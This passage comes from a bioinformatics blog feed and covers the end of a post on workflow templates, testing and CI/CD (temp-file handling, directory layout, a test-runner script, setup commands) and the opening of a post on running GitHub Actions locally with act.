interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation builtin" style="color:hsl(119, 34%, 47%)">len</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation">samples</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">sample</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Process...</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        logger</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"✓ Completed </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">sample</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="temporary-file-management">Temporary File Management<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#temporary-file-management" class="hash-link" aria-label="Direct link to Temporary File Management" title="Direct link to Temporary File Management" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> pathlib </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> Path</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> tempfile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">run_with_temp_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Create and clean temporary files automatically."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">with</span><span class="token plain"> tempfile</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">TemporaryDirectory</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> tmp_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        tmp_path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> Path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tmp_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Work with temp files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        intermediate </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> tmp_path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"intermediate.txt"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ... process ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Copy final result to output</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        final_output </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"final_result.txt"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ... copy ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Temp dir automatically cleaned up when exiting with block</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> final_output</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="scaling-to-50-apps-and-workflows">Scaling to 50+ Apps and Workflows<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#scaling-to-50-apps-and-workflows" class="hash-link" aria-label="Direct link to Scaling to 50+ Apps and Workflows" title="Direct link to Scaling to 50+ Apps and Workflows" translate="no">​</a></h2>
<p>As your template grows, follow these patterns:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="directory-organization">Directory Organization<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#directory-organization" class="hash-link" aria-label="Direct link to Directory Organization" title="Direct link to Directory Organization" translate="no">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apps/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── alignment/          # Group by domain</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── bowtie2/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── bwa/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └── hisat2/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── quality_control/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── fastqc/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── multiqc/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └── qualimap/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">└── variant_calling/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ├── gatk/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    └── samtools/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">workflows/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── rnaseq/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── wgs/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── amplicon/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">└── metagenomics/</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="automated-testing">Automated Testing<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#automated-testing" class="hash-link" aria-label="Direct link to Automated Testing" title="Direct link to Automated Testing" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># test_all.sh - Run all tests</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">failed_tests</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">total_tests</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">app</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> apps/*/*/</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$app</span><span class="token string" style="color:hsl(119, 34%, 47%)">/Makefile"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">total_tests</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$((</span><span class="token variable" style="color:hsl(221, 87%, 60%)">total_tests </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable number" style="color:hsl(35, 99%, 36%)">1</span><span class="token variable" style="color:hsl(221, 87%, 60%)">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-C</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$app</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> unittest</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">failed_tests</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$((</span><span class="token variable" style="color:hsl(221, 87%, 60%)">failed_tests </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable number" style="color:hsl(35, 99%, 36%)">1</span><span class="token variable" style="color:hsl(221, 87%, 60%)">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"❌ Failed: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$app</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"✓ Passed: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$app</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Tests: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$((</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">total_tests </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> failed_tests</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">))</span><span class="token string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$total_tests</span><span class="token string" style="color:hsl(119, 34%, 47%)"> passed"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exit</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$failed_tests</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="documentation">Documentation<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#documentation" class="hash-link" aria-label="Direct link to Documentation" title="Direct link to Documentation" translate="no">​</a></h3>
<p>Keep a central <code>CONTRIBUTING.md</code>:</p>
<div class="language-markdown codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-markdown codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">##</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Adding a New App</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">1.</span><span class="token plain"> Create directory: </span><span class="token code-snippet code keyword" style="color:hsl(301, 63%, 40%)">`mkdir -p apps/category/myapp/tests`</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">2.</span><span class="token plain"> Copy template: </span><span class="token code-snippet code keyword" style="color:hsl(301, 63%, 40%)">`cp -r apps/fastqc/* apps/category/myapp/`</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">3.</span><span class="token plain"> Edit </span><span class="token code-snippet code keyword" style="color:hsl(301, 63%, 40%)">`main.py`</span><span class="token plain"> with your logic</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">4.</span><span class="token plain"> Write tests in </span><span class="token code-snippet code keyword" style="color:hsl(301, 63%, 40%)">`tests/`</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">5.</span><span class="token plain"> Update </span><span class="token code-snippet code keyword" style="color:hsl(301, 63%, 40%)">`README.md`</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">6.</span><span class="token plain"> Create PR</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">##</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Adding a New Workflow</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">1.</span><span class="token plain"> Create directory: </span><span class="token code-snippet code keyword" style="color:hsl(301, 63%, 40%)">`mkdir -p workflows/mypipeline/tests`</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">2.</span><span class="token plain"> Create </span><span class="token code-snippet code keyword" style="color:hsl(301, 63%, 40%)">`main.py`</span><span class="token plain"> that composes apps</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">3.</span><span class="token plain"> Write E2E test in </span><span class="token code-snippet code keyword" style="color:hsl(301, 63%, 40%)">`tests/`</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">4.</span><span class="token plain"> Add to </span><span class="token code-snippet code keyword" style="color:hsl(301, 63%, 40%)">`.github/workflows/tests.yaml`</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h2>
<ol>
<li class=""><strong>Template consistency</strong> → New projects setup in 30 minutes</li>
<li class=""><strong>Modular structure</strong> → Apps are reusable, workflows compose them</li>
<li class=""><strong>Testing discipline</strong> → Unit + E2E tests, both automated</li>
<li class=""><strong>Smart CI/CD</strong> → Only test changed files (5-10x faster)</li>
<li class=""><strong>Multi-framework</strong> → Python, Nextflow, Snakemake all supported</li>
<li class=""><strong>Reproducibility</strong> → Docker + Pixi guarantees same environment everywhere</li>
<li class=""><strong>Scaling</strong> → Pattern works for 5 apps or 50+ apps</li>
</ol>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="getting-started">Getting Started<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#getting-started" class="hash-link" aria-label="Direct link to Getting Started" title="Direct link to Getting Started" translate="no">​</a></h2>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Clone the template</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> clone git@github.com:riverxdata/bioinfor-wf-template.git my-analysis</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install dependencies</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> my-analysis</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pip </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-r</span><span class="token plain"> requirements.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run tests</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pytest </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or with Pixi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi global </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> act</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">test</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or locally simulate GitHub Actions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act push</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="references">References<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#references" class="hash-link" aria-label="Direct link to References" title="Direct link to References" translate="no">​</a></h2>
<ul>
<li class=""><a href="https://github.com/riverxdata/bioinfor-wf-template" target="_blank" rel="noopener noreferrer" class="">GitHub Repository</a></li>
<li class=""><a href="https://docs.pytest.org/" target="_blank" rel="noopener noreferrer" class="">pytest Documentation</a></li>
<li class=""><a href="https://biocontainers.pro/" target="_blank" rel="noopener noreferrer" class="">Docker for Bioinformatics</a></li>
<li class=""><a href="https://nextflow.io/docs/latest/" target="_blank" rel="noopener noreferrer" class="">Nextflow Guide</a></li>
<li class=""><a href="https://snakemake.readthedocs.io/" target="_blank" rel="noopener noreferrer" class="">Snakemake Tutorial</a></li>
</ul>
<p><strong>Start building standardized bioinformatics pipelines today! 🧬🚀</strong></p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="ci-cd" term="ci-cd"/>
        <category label="bioinformatics" term="bioinformatics"/>
        <category label="python" term="python"/>
        <category label="docker" term="docker"/>
        <category label="testing" term="testing"/>
        <category label="template" term="template"/>
        <category label="reproducibility" term="reproducibility"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Running GitHub Actions Locally with act: 5x Faster Development]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action</id>
        <link href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action"/>
        <updated>2026-02-03T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[GitHub Actions are powerful for automating bioinformatics pipelines, but waiting 5-10 minutes for each cloud run is painful during development. act lets you run GitHub Actions workflows locally on your machine in seconds, slashing feedback time by 5x.]]></summary>
        <content type="html"><![CDATA[<p>GitHub Actions are powerful for automating bioinformatics pipelines, but waiting 5-10 minutes for each cloud run is painful during development. <strong><code>act</code></strong> lets you run GitHub Actions workflows <strong>locally on your machine</strong> in seconds, slashing feedback time by 5x.</p>
<p>In this post, we'll explore <code>act</code>, a command-line tool that runs GitHub Actions locally using Docker. Perfect for testing ML pipelines, gene expression analysis, and CI/CD workflows before pushing to GitHub.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-test-github-actions-locally">Why Test GitHub Actions Locally?<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#why-test-github-actions-locally" class="hash-link" aria-label="Direct link to Why Test GitHub Actions Locally?" title="Direct link to Why Test GitHub Actions Locally?" translate="no">​</a></h2>
<p>Traditional GitHub Actions workflow:</p>
<ol>
<li class="">Write workflow → Push to GitHub</li>
<li class="">Wait 5-10 minutes for cloud runner</li>
<li class="">Workflow fails → Fix locally → Push again</li>
<li class="">Repeat steps 2-3 (multiple times!)</li>
</ol>
<p><strong>Total feedback cycle: 30+ minutes for a simple fix</strong></p>
<p>With <code>act</code>:</p>
<ol>
<li class="">Write workflow</li>
<li class="">Run locally with <code>act</code> → Instant feedback (10-30 seconds)</li>
<li class="">Debug and iterate locally</li>
<li class="">Push confident code to GitHub</li>
</ol>
<p><strong>Total feedback cycle: 5 minutes</strong></p>
<hr>
